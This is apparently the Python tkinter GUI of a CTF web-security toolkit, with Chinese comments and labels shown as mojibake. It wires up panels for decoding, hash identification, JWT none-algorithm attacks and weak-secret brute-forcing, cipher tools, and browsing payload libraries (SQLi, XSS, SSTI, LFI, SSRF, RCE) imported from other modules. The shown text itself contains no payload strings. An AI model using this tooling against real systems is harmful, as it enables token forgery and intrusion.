# -*- coding: utf-8 -*-
"""Yang-Web å¾å½¢çé¢ (tkinter).

é¶å¤é¨ä¾èµï¼Python èªå¸¦ tkinterã
å¸å±: å·¦ä¾§åè½æ  + å³ä¾§åå®¹åºï¼Tab å¼åæ¢ã
"""
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import sys
import os

# å¯¼å¥æ ¸å¿æ¨¡å
from .core.decoder import (chain_decode, brute_decode, detect_encoding, DECODERS,
    decode_base64, decode_base32, decode_base16, decode_base58, decode_base85,
    decode_url, decode_html, decode_rot13, decode_binary, decode_octal,
    decode_decimal, decode_morse, decode_unicode_escape)
from .core.hashid import identify as hash_identify
from .core.jwt import decode_jwt, analyze_jwt, none_attack, brute_jwt, BUILTIN_WORDLIST
from .core.misc_crypto import (
    CIPHER_TYPES, list_ciphers, search_ciphers, get_cipher,
    get_image_path, get_image2_path, get_text_content, get_categories,
    encode as mc_encode, decode as mc_decode,
)
from .payloads import ssti, sqli, lfi, ssrf, xss, php, upload

try:
    from .payloads.rce import RCE_CMD, RCE_BYPASS
except Exception:
    RCE_CMD = {}
    RCE_BYPASS = {}


BG = "#1e1e2e"
FG = "#cdd6f4"
ACCENT = "#89b4fa"
GREEN = "#a6e3a1"
RED = "#f38ba8"
YELLOW = "#f9e2af"
DARK = "#181825"
INPUT_BG = "#313244"
BORDER = "#45475a"

# ââ ä¸»é¢ ââ

def apply_theme(root):
    root.configure(bg=BG)
    style = ttk.Style()
    style.theme_use("clam")
    style.configure("TNotebook", background=BG, borderwidth=0)
    style.configure("TNotebook.Tab", background=DARK, foreground=FG, padding=[16, 8],
                    borderwidth=0, font=("Microsoft YaHei UI", 10))
    style.map("TNotebook.Tab", background=[("selected", INPUT_BG)], foreground=[("selected", ACCENT)])
    style.configure("TFrame", background=BG)
    style.configure("TLabel", background=BG, foreground=FG, font=("Microsoft YaHei UI", 10))
    style.configure("TButton", background=INPUT_BG, foreground=FG, borderwidth=1,
                    font=("Microsoft YaHei UI", 10))
    style.configure("TLabelframe", background=BG, foreground=ACCENT, borderwidth=1,
                    font=("Microsoft YaHei UI", 10, "bold"))
    style.configure("TLabelframe.Label", background=BG, foreground=ACCENT)
    style.configure("TCombobox", fieldbackground=INPUT_BG, background=INPUT_BG,
                    foreground=FG, selectbackground=ACCENT)

# ââ è¾å© ââ

def _scrollable_text(parent, height=12, width=80):
    frame = tk.Frame(parent, bg=BG)
    txt = tk.Text(frame, height=height, width=width, bg=INPUT_BG, fg=FG,
                  insertbackground=ACCENT, relief="flat", borderwidth=0,
                  font=("Cascadia Code", 10), padx=10, pady=8,
                  wrap=tk.WORD)
    scroll = tk.Scrollbar(frame, command=txt.yview)
    txt.configure(yscrollcommand=scroll.set)
    txt.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scroll.pack(side=tk.RIGHT, fill=tk.Y)
    return frame, txt

def _label(parent, text, fg=FG, font_size=10, bold=False, pady=4):
    w = tk.Label(parent, text=text, bg=BG, fg=fg,
                 font=("Microsoft YaHei UI", font_size, "bold" if bold else "normal"))
    w.pack(anchor="w", pady=(pady, 0))
    return w

def _button(parent, text, command, accent=False, width=None):
    bg = ACCENT if accent else INPUT_BG
    fg = DARK if accent else FG
    btn = tk.Button(parent, text=text, command=command, bg=bg, fg=fg,
                    activebackground=BORDER, activeforeground=FG, relief="flat",
                    borderwidth=0, padx=16, pady=6, cursor="hand2",
                    font=("Microsoft YaHei UI", 10, "bold" if accent else "normal"))
    if width:
        btn.configure(width=width)
    btn.pack(anchor="w", pady=2)
    return btn

def _entry(parent, width=60):
    e = tk.Entry(parent, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
                 relief="flat", borderwidth=0, font=("Cascadia Code", 11),
                 width=width)
    e.pack(fill=tk.X, pady=(2, 6), ipady=4)
    return e

def _combo(parent, values, default=None, **kw):
    cb = ttk.Combobox(parent, values=values, state="readonly",
                      font=("Cascadia Code", 10), **kw)
    if default:
        cb.set(default)
    cb.pack(fill=tk.X, pady=(2, 6))
    return cb

def _output_area(parent, height=18):
    """è¿å (frame, text_widget) æ¹ä¾¿éè¦èªå®ä¹éç½®."""
    return _scrollable_text(parent, height=height)

def _append(txt_widget, text, tag=None):
    txt_widget.configure(state="normal")
    if not text.endswith('\n'):
        text = text + '\n'
    txt_widget.insert(tk.END, text)
    txt_widget.configure(state="disabled")
    txt_widget.see(tk.END)

def _clear_output(txt_widget):
    txt_widget.configure(state="normal")
    txt_widget.delete("1.0", tk.END)
    txt_widget.configure(state="disabled")


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  ååè½é¢æ¿
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

class DecodePanel(tk.Frame):
    """æºè½è§£ç é¢æ¿ â ç²è´´å³ç¨ï¼èªå¨è¯å«+ä¸é®è§£ç ."""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "ð æºè½è§£ç å¨", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "ç²è´´å¯æ â èªå¨è¯å«ç¼ç ç±»å â ä¸é®è§£ç  | æ¯æ 14 ç§ç¼ç ", fg=YELLOW, font_size=9)

        # ââ Input area ââ
        input_frame = tk.Frame(self, bg=DARK, bd=2, relief="groove")
        input_frame.pack(fill=tk.X, padx=4, pady=(8, 4))
        _label(input_frame, "ð¥ ç²è´´å¯æå°è¿é:", fg=ACCENT, font_size=10, pady=2)
        self.input_text = scrolledtext.ScrolledText(input_frame, height=5,
                                                     bg=INPUT_BG, fg=FG,
                                                     insertbackground=ACCENT,
                                                     relief="flat", borderwidth=0,
                                                     font=("Cascadia Code", 11),
                                                     wrap=tk.WORD)
        self.input_text.pack(fill=tk.X, padx=6, pady=(0, 6))

        # ââ Action buttons ââ
        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(anchor="w", pady=4, padx=4)
        tk.Button(btn_frame, text="ð è¯å«ç¼ç ", command=self._detect,
                  bg=ACCENT, fg=DARK, activebackground=GREEN, relief="flat",
                  padx=16, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(btn_frame, text="ð£ æ´åå¨é¨", command=self._brute,
                  bg=YELLOW, fg=DARK, activebackground=ACCENT, relief="flat",
                  padx=16, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(btn_frame, text="ð é¾å¼è§£ç ", command=self._chain,
                  bg=GREEN, fg=DARK, activebackground=ACCENT, relief="flat",
                  padx=16, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(btn_frame, text="ð æ¸ç©º", command=self._clear_all,
                  bg=RED, fg=DARK, activebackground="#ff6b6b", relief="flat",
                  padx=16, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT)

        # ââ Detection result + quick-decode buttons (shown after detect) ââ
        self.detect_frame = tk.Frame(self, bg=BG)
        self.detect_frame.pack(fill=tk.X, padx=4, pady=2)
        self.detect_label = tk.Label(self.detect_frame, text="", bg=BG, fg=YELLOW,
                                      font=("Microsoft YaHei UI", 9, "bold"),
                                      anchor="w", justify="left")
        self.detect_label.pack(anchor="w")
        self.detect_btns = tk.Frame(self.detect_frame, bg=BG)
        self.detect_btns.pack(anchor="w", pady=2)

        # ââ Manual picker ââ
        manual_bar = tk.Frame(self, bg=BG)
        manual_bar.pack(fill=tk.X, padx=4, pady=2)
        tk.Label(manual_bar, text="æå¨éæ©:", bg=BG, fg=FG,
                 font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(0, 4))
        manual_opts = ["base64", "base32", "base16/hex", "url", "html", "unicode",
                       "binary", "octal", "decimal", "rot13", "morse", "base58", "base85"]
        self.manual_var = tk.StringVar(value="base64")
        self.manual_cb = ttk.Combobox(manual_bar, textvariable=self.manual_var,
                                       values=manual_opts, state="readonly", width=14)
        self.manual_cb.pack(side=tk.LEFT, padx=2)
        tk.Button(manual_bar, text="Decode", command=self._manual_decode,
                  bg=INPUT_BG, fg=ACCENT, activebackground=BORDER, relief="flat",
                  padx=12, pady=2, cursor="hand2",
                  font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=2)

        # ââ Output ââ
        _label(self, "ð¤ è§£ç ç»æ:", pady=8)
        self.output_frame, self.output = _output_area(self, 12)
        self.output_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))

    def _get_text(self):
        return self.input_text.get("1.0", tk.END).strip()

    def _clear_all(self):
        self.input_text.delete("1.0", tk.END)
        _clear_output(self.output)
        for w in self.detect_btns.winfo_children():
            w.destroy()
        self.detect_label.config(text="")

    def _detect(self):
        """æ£æµç¼ç ç±»åå¹¶æ¾ç¤ºå¯ç¹å»è§£ç æé®."""
        text = self._get_text()
        _clear_output(self.output)
        for w in self.detect_btns.winfo_children():
            w.destroy()
        if not text:
            self.detect_label.config(text="â  è¯·åç²è´´å¯æ")
            _append(self.output, "â  è¯·åç²è´´å¯æå°ä¸æ¹è¾å¥æ¡")
            return

        # Run detection
        detections = detect_encoding(text)
        if not detections:
            self.detect_label.config(text="â æªè¯å«å°å·²ç¥ç¼ç ")
            _append(self.output, "â èªå¨æ£æµæªè¯å«å°å·²ç¥ç¼ç ç±»å\n\nð¡ è¯è¯:\n  â¢ ç¹ãð£ æ´åå¨é¨ãå°è¯ææè§£ç å¨\n  â¢ ç¨ãæå¨éæ©ãä¸ææ¡æå®ç¼ç ")
            return

        # Show detection results
        lines = [f"â æ£æµå° {len(detections)} ç§å¯è½ç¼ç :"]
        for enc_id, desc, conf in detections[:8]:
            emoji = "ð¢" if conf >= 80 else "ð¡" if conf >= 50 else "ð "
            lines.append(f"  {emoji} {desc} â ç½®ä¿¡åº¦ {conf}%")
        self.detect_label.config(text="\n".join(lines))

        # Show results + quick-decode buttons
        _append(self.output, f"ð è¾å¥ ({len(text)} å­ç¬¦):\n  {text[:200]}\n\nð æ£æµç»æ:\n")
        for enc_id, desc, conf in detections[:8]:
            _append(self.output, f"  {'ð¢' if conf >= 80 else 'ð¡' if conf >= 50 else 'ð '} {desc} ({enc_id}) â {conf}%")

        # Create quick-decode buttons for top results
        for enc_id, desc, conf in detections[:5]:
            btn = tk.Button(self.detect_btns,
                           text=f"ð ç¨ {desc.split()[0]} è§£ç ",
                           command=lambda eid=enc_id, edesc=desc: self._quick_decode(eid, edesc),
                           bg=INPUT_BG, fg=GREEN, activebackground=GREEN,
                           activeforeground=DARK, relief="flat",
                           padx=10, pady=2, cursor="hand2",
                           font=("Microsoft YaHei UI", 9))
            btn.pack(side=tk.LEFT, padx=2, pady=2)

    def _quick_decode(self, enc_id, desc):
        """Quick decode with a specific encoding."""
        text = self._get_text()
        decoder_func, _ = DECODERS.get(enc_id, (None, None))
        if not decoder_func:
            _append(self.output, f"\nâ è§£ç å¨ {desc} ä¸å¯ç¨")
            return
        try:
            result = decoder_func(text)
            _append(self.output, f"\n{'â'*50}\nð ä½¿ç¨ {desc} è§£ç :\n{'â'*50}\n{result}")
        except Exception as e:
            _append(self.output, f"\nâ {desc} è§£ç å¤±è´¥: {e}")

    def _manual_decode(self):
        """Manually decode with selected encoding."""
        text = self._get_text()
        if not text:
            _clear_output(self.output)
            _append(self.output, "â  è¯·åç²è´´å¯æ")
            return
        choice = self.manual_var.get().split("/")[0]
        decoders = {
            "base64": ("base64", decode_base64),
            "base32": ("base32", decode_base32),
            "base16": ("base16", decode_base16),
            "url": ("url", decode_url),
            "html": ("html", decode_html),
            "unicode": ("unicode", decode_unicode_escape),
            "binary": ("binary", decode_binary),
            "octal": ("octal", decode_octal),
            "decimal": ("decimal", decode_decimal),
            "rot13": ("rot13", decode_rot13),
            "morse": ("morse", decode_morse),
            "base58": ("base58", decode_base58),
            "base85": ("base85", decode_base85),
        }
        if choice not in decoders:
            _append(self.output, f"â ä¸æ¯æçç¼ç : {choice}")
            return
        enc_id, func = decoders[choice]
        _clear_output(self.output)
        try:
            result = func(text)
            _append(self.output, f"ð¥ {text[:80]}...\n\nð ç¨ {enc_id} è§£ç :\n{'â'*50}\n{result}")
        except Exception as e:
            _append(self.output, f"â {enc_id} è§£ç å¤±è´¥: {e}")

    def _chain(self):
        """Chain decode: recursively decode until can't."""
        text = self._get_text()
        _clear_output(self.output)
        if not text:
            _append(self.output, "â  è¯·åç²è´´å¯æ")
            return
        _append(self.output, f"ð è¾å¥ ({len(text)} å­ç¬¦):\n  {text[:200]}\n\nð é¾å¼è§£ç :\n")
        try:
            steps = chain_decode(text)
            if not steps:
                _append(self.output, "â æªè¯å«å°å¯é¾å¼è§£ç çç¼ç ")
                return
            for i, step in enumerate(steps):
                enc_id, enc_desc, decoded = step
                _append(self.output, f"  Step {i+1}: {enc_desc} ({enc_id})")
                _append(self.output, f"           â {decoded[:150]}\n")
            _append(self.output, f"\n{'â'*50}\nâ æç»ç»æ: {steps[-1][2]}\n{'â'*50}")
        except Exception as e:
            _append(self.output, f"â é¾å¼è§£ç å¤±è´¥: {e}\n\nð¡ è¯è¯ãð è¯å«ç¼ç ãæãð£ æ´åå¨é¨ã")

    def _brute(self):
        """Brute force: try ALL decoders."""
        text = self._get_text()
        _clear_output(self.output)
        if not text:
            _append(self.output, "â  è¯·åç²è´´å¯æ")
            return
        _append(self.output, f"ð è¾å¥ ({len(text)} å­ç¬¦):\n  {text[:200]}\n\nð£ æ´åå°è¯ææè§£ç å¨:\n")
        try:
            results = brute_decode(text)
            if not results:
                _append(self.output, "\nâ ææè§£ç å¨åæªå¾å°å¯è¯»ç»æ")
                return
            _append(self.output, f"\næ¾å° {len(results)} ä¸ªå¯è¯»ç»æ:\n{'â'*50}")
            for r in results:
                enc_id, enc_desc, decoded = r[0], r[1], r[2]
                confidence = r[3] if len(r) > 3 else 50
                marker = "â­" if confidence >= 80 else "  "
                _append(self.output, f"\n{marker} {enc_desc} ({enc_id}): {decoded[:200]}")
        except Exception as e:
            _append(self.output, f"â éè¯¯: {e}")


class PayloadPanel(tk.Frame):
    """éç¨ Payload é¢æ¿"""
    def __init__(self, parent, title, emoji, get_data_fn, search_fn=None, analyzer_fn=None):
        super().__init__(parent, bg=BG)
        self.get_data = get_data_fn
        self.search_fn = search_fn
        self.analyzer_fn = analyzer_fn

        _label(self, f"{emoji} {title}", fg=ACCENT, font_size=16, bold=True, pady=8)

        # é¶åºåææ¡ (Upload ä¸ç¨)
        if analyzer_fn:
            analyze_frame = tk.Frame(self, bg=DARK)
            analyze_frame.pack(fill=tk.X, padx=4, pady=(0,4))
            _label(analyze_frame, "ð¯ åæ:", fg=ACCENT, pady=0, font_size=11)
            self.analyze_entry = tk.Entry(analyze_frame, bg=INPUT_BG, fg=FG,
                insertbackground=ACCENT, relief="flat", borderwidth=0,
                font=("Cascadia Code", 11))
            self.analyze_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=6, ipady=4)
            self.analyze_entry.bind("<Return>", lambda e: self._do_analyze())
            tk.Button(analyze_frame, text="åæ", command=self._do_analyze,
                bg=ACCENT, fg=DARK, relief="flat", padx=14, pady=4,
                cursor="hand2", font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(2,0))

        # æç´¢
        search_frame = tk.Frame(self, bg=BG)
        search_frame.pack(fill=tk.X, pady=4)
        _label(search_frame, "ð æç´¢:", pady=0)
        self.search_entry = tk.Entry(search_frame, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
                                     relief="flat", borderwidth=0, font=("Cascadia Code", 11))
        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(8, 4), ipady=4)
        tk.Button(search_frame, text="æç´¢", command=self._search, bg=ACCENT, fg=DARK,
                  relief="flat", padx=12, pady=4, cursor="hand2",
                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT)

        # åç±»éæ© (æç´¢ä¸æ¹)
        top = tk.Frame(self, bg=BG)
        top.pack(fill=tk.X, pady=4)
        _label(top, "åç±»:", pady=0)
        self.category_var = tk.StringVar(value="-- éæ©åç±» --")
        self.category_combo = _combo(top, ["-- éæ©åç±» --"], textvariable=self.category_var)
        self.category_combo.bind("<<ComboboxSelected>>", lambda e: self._refresh())
        self.top_frame = top

        self.output_frame, self.output = _output_area(self, 22)
        self.output_frame.pack(fill=tk.BOTH, expand=True)
        _append(self.output, "ð è¯·å¨ä¸æ¹éæ©ä¸ä¸ªåç±»æ¥ç Payload")

    def _refresh(self):
        _clear_output(self.output)
        cat = self.category_var.get()
        if not cat or cat == "-- éæ©åç±» --":
            _append(self.output, "ð è¯·å¨ä¸æ¹éæ©ä¸ä¸ªåç±»æ¥ç Payload")
            return
        try:
            data = self.get_data(cat)
            self._display(data)
        except Exception as e:
            _append(self.output, f"â éè¯¯: {e}")

    def _do_analyze(self):
        """è¿è¡é¶åºåæ."""
        if not self.analyzer_fn:
            return
        blacklist = self.analyze_entry.get().strip()
        if not blacklist:
            _clear_output(self.output)
            _append(self.output, "ð è¯·å¨ä¸æ¹è¾å¥é¶åºé»åå (å¦: php,php3,php5)")
            return
        _clear_output(self.output)
        try:
            result = self.analyzer_fn(blacklist)
            _append(self.output, result)
        except Exception as e:
            _append(self.output, f"â åæåºé: {e}")

    def _display(self, data):
        if isinstance(data, dict):
            for key, items in data.items():
                _append(self.output, f"\nâ¸ {key}\n")
                if isinstance(items, list):
                    for item in items:
                        if isinstance(item, str):
                            _append(self.output, f"  â¢ {item}")
                        elif isinstance(item, dict):
                            _append(self.output, f"  â¢ {item.get('name','?')}")
                            if 'payload' in item:
                                _append(self.output, f"    {item['payload'][:150]}")
                            if 'tip' in item:
                                _append(self.output, f"    ð¡ {item['tip'][:120]}")
                elif isinstance(items, dict):
                    for sub_key, sub_items in items.items():
                        if isinstance(sub_items, list):
                            _append(self.output, f"  â¸ {sub_key}:")
                            for item in sub_items:
                                _append(self.output, f"    â¢ {str(item)[:200]}")
                        else:
                            _append(self.output, f"  â¸ {sub_key}: {sub_items}")
                else:
                    _append(self.output, f"  {items}")

    def _search(self):
        kw = self.search_entry.get().strip()
        if not kw or not self.search_fn:
            return
        _clear_output(self.output)
        results = self.search_fn(kw)
        if results:
            _append(self.output, f"ð '{kw}' çæç´¢ç»æ ({len(results)} æ¡):\n")
            for r in results[:30]:
                cat = r.get("category", "")
                nm = r.get("name", "")
                payload = r.get("payload", r.get("content", ""))
                _append(self.output, f"\n  [{cat}] {nm}")
                if payload:
                    _append(self.output, f"  {str(payload)[:200]}")
        else:
            _append(self.output, f"æªæ¾å°åå« '{kw}' çç»æ")

    def set_categories(self, categories):
        self.category_combo["values"] = ["-- éæ©åç±» --"] + list(categories)
        self.category_combo.set("-- éæ©åç±» --")


class HashPanel(tk.Frame):
    """Hash è¯å«é¢æ¿"""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "ð Hash ç±»åè¯å«", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "æ¯æ 40+ ç§ Hash ç®æ³èªå¨å¹é", fg=YELLOW, font_size=9)

        _label(self, "ð¥ è¾å¥ Hash:", pady=8)
        self.hash_entry = _entry(self, 70)
        self.hash_entry.bind("<Return>", lambda e: self._identify())

        tk.Button(self, text="ð è¯å«", command=self._identify, bg=ACCENT, fg=DARK,
                  relief="flat", padx=20, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 11, "bold")).pack(anchor="w", pady=4)

        _label(self, "ð¤ è¯å«ç»æ:", pady=8)
        self.output_frame, self.output = _output_area(self, 14)
        self.output_frame.pack(fill=tk.BOTH, expand=True)

    def _identify(self):
        _clear_output(self.output)
        h = self.hash_entry.get().strip()
        if not h:
            _append(self.output, "â  è¯·åè¾å¥ Hash å¼")
            return
        try:
            result = hash_identify(h)
            _append(self.output, f"ð è¾å¥: {h[:80]}")
            _append(self.output, f"ð é¿åº¦: {len(h)} å­ç¬¦")
            _append(self.output, f"\nð å¯è½çç®æ³:")
            if isinstance(result, list):
                for r in result:
                    _append(self.output, f"  â¢ {r}")
            elif isinstance(result, dict):
                for algo, confidence in result.items():
                    _append(self.output, f"  â¢ {algo} (ç½®ä¿¡åº¦: {confidence})")
            else:
                _append(self.output, f"  {result}")
        except Exception as e:
            _append(self.output, f"â éè¯¯: {e}")


class JWTPanel(tk.Frame):
    """JWT åæé¢æ¿"""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "ð JWT åæä¸æ»å»", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "è§£æ â åæ â None æ»å» â å¼±å¯é¥çç ´ â ä¼ªé ", fg=YELLOW, font_size=9)

        _label(self, "ð¥ JWT Token:", pady=8)
        self.jwt_entry = _entry(self, 70)

        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(anchor="w", pady=4)
        for label, cmd in [("ð è§£æ", self._decode), ("ð åæ", self._analyze),
                           ("â¡ Noneæ»å»", self._none), ("ð£ å¼±å¯é¥çç ´", self._brute)]:
            tk.Button(btn_frame, text=label, command=cmd, bg=INPUT_BG, fg=FG,
                      activebackground=ACCENT, relief="flat", padx=12, pady=5,
                      cursor="hand2", font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT, padx=2)

        _label(self, "ð¤ ç»æ:", pady=8)
        self.output_frame, self.output = _output_area(self, 16)
        self.output_frame.pack(fill=tk.BOTH, expand=True)

    def _get_token(self):
        return self.jwt_entry.get().strip()

    def _decode(self):
        _clear_output(self.output)
        t = self._get_token()
        if not t:
            _append(self.output, "â  è¯·è¾å¥ JWT")
            return
        try:
            header, payload = decode_jwt(t)
            _append(self.output, f"ð Header:\n{_pretty_json(header)}\n")
            _append(self.output, f"ð Payload:\n{_pretty_json(payload)}")
        except Exception as e:
            _append(self.output, f"â éè¯¯: {e}")

    def _analyze(self):
        _clear_output(self.output)
        t = self._get_token()
        if not t: return
        try:
            r = analyze_jwt(t)
            for k, v in r.items():
                _append(self.output, f"{k}: {v}\n")
        except Exception as e:
            _append(self.output, f"â éè¯¯: {e}")

    def _none(self):
        _clear_output(self.output)
        t = self._get_token()
        if not t: return
        try:
            r = none_attack(t)
            _append(self.output, f"â¡ None ç®æ³æ»å»:\n{r}")
        except Exception as e:
            _append(self.output, f"â éè¯¯: {e}")

    def _brute(self):
        _clear_output(self.output)
        t = self._get_token()
        if not t: return
        _append(self.output, "ð£ å¼±å¯é¥çç ´ä¸­... (ä½¿ç¨åç½®è¯åº)\n")
        try:
            r = brute_jwt(t)
            if r:
                _append(self.output, f"â å¯é¥æ¾å°: {r}")
            else:
                _append(self.output, "â åç½®è¯åºæªå¹é")
        except Exception as e:
            _append(self.output, f"â éè¯¯: {e}")


class MiscCryptoPanel(tk.Frame):
    """Misc Crypto â 20+ common cipher types with encode/decode + reference images."""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "ð Misc Crypto Knowledge Base", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "20+ CTF Misc å¯ç ç±»å â ç¼ç /è§£ç  + åèå¾/è¯´æææ¬", fg=YELLOW, font_size=9)

        # ââ Top bar: category + search ââ
        top = tk.Frame(self, bg=BG)
        top.pack(fill=tk.X, padx=4, pady=(8, 4))

        tk.Label(top, text="åç±»:", bg=BG, fg=ACCENT,
                 font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(0, 4))
        cats = ["å¨é¨"] + get_categories()
        self.cat_var = tk.StringVar(value="å¨é¨")
        self.cat_cb = ttk.Combobox(top, textvariable=self.cat_var, values=cats,
                                    state="readonly", width=16)
        self.cat_cb.pack(side=tk.LEFT, padx=2)
        self.cat_cb.bind("<<ComboboxSelected>>", self._on_cat_change)

        tk.Label(top, text="æç´¢:", bg=BG, fg=ACCENT,
                 font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(12, 4))
        self.search_var = tk.StringVar()
        self.search_entry = tk.Entry(top, textvariable=self.search_var,
                                      bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
                                      relief="flat", font=("Cascadia Code", 11),
                                      width=20)
        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)
        self.search_entry.bind("<KeyRelease>", self._on_search)

        # ââ Main area: list + detail ââ
        panes = tk.PanedWindow(self, bg=BG, sashwidth=3)
        panes.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        # Left: cipher list
        list_frame = tk.Frame(panes, bg=BG)
        panes.add(list_frame, width=260)
        _label(list_frame, "å¯ç ç±»å:", pady=4)
        self.cipher_list = tk.Listbox(list_frame, bg=INPUT_BG, fg=FG,
                                       selectbackground=ACCENT, selectforeground=DARK,
                                       relief="flat", borderwidth=0,
                                       font=("Microsoft YaHei UI", 10), height=18)
        self.cipher_list.pack(fill=tk.BOTH, expand=True, pady=(0, 4))
        self.cipher_list.bind("<<ListboxSelect>>", self._on_cipher_select)

        # Right: detail + io + reference
        right = tk.Frame(panes, bg=BG)
        panes.add(right, width=550)

        # Detail info
        self.info_var = tk.StringVar(value="")
        _label(right, "è¯¦æ:", pady=4)
        self.info_label = tk.Label(right, textvariable=self.info_var, bg=BG, fg=FG,
                                    anchor="nw", justify="left",
                                    font=("Microsoft YaHei UI", 10),
                                    wraplength=520)
        self.info_label.pack(fill=tk.X, pady=(0, 4))

        # Reference area (image button + text content)
        ref_header = tk.Frame(right, bg=BG)
        ref_header.pack(fill=tk.X, pady=(2, 2))
        tk.Label(ref_header, text="åèåå®¹:", bg=BG, fg=YELLOW,
                 font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT)
        self.view_img_btn = tk.Button(ref_header, text="ð¼ æ¥çåå¾",
                                       command=self._open_image,
                                       bg=INPUT_BG, fg=ACCENT,
                                       activebackground=ACCENT, activeforeground=DARK,
                                       relief="flat", padx=12, pady=3,
                                       cursor="hand2",
                                       font=("Microsoft YaHei UI", 9, "bold"))
        self.view_img2_btn = tk.Button(ref_header, text="ð¼ å¾2",
                                        command=self._open_image2,
                                        bg=INPUT_BG, fg=YELLOW,
                                        activebackground=YELLOW, activeforeground=DARK,
                                        relief="flat", padx=10, pady=3,
                                        cursor="hand2",
                                        font=("Microsoft YaHei UI", 9, "bold"))
        self.img_path_var = tk.StringVar(value="")
        tk.Label(ref_header, textvariable=self.img_path_var, bg=BG, fg=DARK,
                 font=("Cascadia Code", 7)).pack(side=tk.RIGHT, padx=4)

        # Reference text content
        self.ref_frame, self.ref_text = _output_area(right, 10)
        self.ref_frame.pack(fill=tk.BOTH, expand=True, pady=(2, 4))

        # IO area
        io_bar = tk.Frame(right, bg=BG)
        io_bar.pack(fill=tk.X, pady=4)
        tk.Label(io_bar, text="è¾å¥:", bg=BG, fg=ACCENT,
                 font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT, padx=(0, 4))
        self.io_entry = tk.Entry(io_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
                                  relief="flat", font=("Cascadia Code", 11))
        self.io_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)
        self.io_entry.bind("<Return>", lambda e: self._do_encode())
        tk.Button(io_bar, text="Encode", command=self._do_encode,
                  bg=ACCENT, fg=DARK, activebackground=GREEN, relief="flat",
                  padx=12, pady=3, cursor="hand2",
                  font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=2)
        tk.Button(io_bar, text="Decode", command=self._do_decode,
                  bg=INPUT_BG, fg=ACCENT, activebackground=BORDER, relief="flat",
                  padx=12, pady=3, cursor="hand2",
                  font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=2)

        # Key entry (for vigenere etc.)
        key_bar = tk.Frame(right, bg=BG)
        key_bar.pack(fill=tk.X, pady=(0, 4))
        tk.Label(key_bar, text="å¯é¥:", bg=BG, fg=YELLOW,
                 font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(0, 4))
        self.key_entry = tk.Entry(key_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
                                   relief="flat", font=("Cascadia Code", 11), width=20)
        self.key_entry.pack(side=tk.LEFT, padx=4, ipady=2)

        # Output
        _label(right, "è¾åº:", pady=4)
        self.output_frame, self.output = _output_area(right, 6)
        self.output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 4))

        # Store state
        self._selected_cid = None
        self._current_image_path = ""

        # Load initial data
        self._ciphers = list_ciphers()
        self._refresh_list()

    def _refresh_list(self):
        """Rebuild the cipher listbox."""
        self.cipher_list.delete(0, tk.END)
        for c in self._ciphers:
            tag = "ð§" if c.get("encode") else "ð"
            self.cipher_list.insert(tk.END, tag + " " + c["name"])

    def _on_cat_change(self, event=None):
        cat = self.cat_var.get()
        if cat == "å¨é¨":
            self._ciphers = list_ciphers()
        else:
            self._ciphers = list_ciphers(cat)
        self._refresh_list()
        self._clear_detail()

    def _on_search(self, event=None):
        q = self.search_var.get().strip()
        if q:
            self._ciphers = search_ciphers(q)
        else:
            cat = self.cat_var.get()
            self._ciphers = list_ciphers() if cat == "å¨é¨" else list_ciphers(cat)
        self._refresh_list()

    def _on_cipher_select(self, event=None):
        sel = self.cipher_list.curselection()
        if not sel:
            return
        idx = sel[0]
        if idx >= len(self._ciphers):
            return
        info = self._ciphers[idx]
        cid = info.get("id", "")
        _clear_output(self.output)

        # Build info lines
        lines = [
            "åç§°: " + info["name"],
            "ID:   " + cid,
            "åç±»: " + info["category"],
            "å«å: " + ", ".join(info.get("aliases", []) or ["æ "]),
            "æè¿°: " + info["description"],
        ]
        if info.get("features"):
            lines.append("ç¹å¾: " + ", ".join(info["features"]))
        if info.get("encode"):
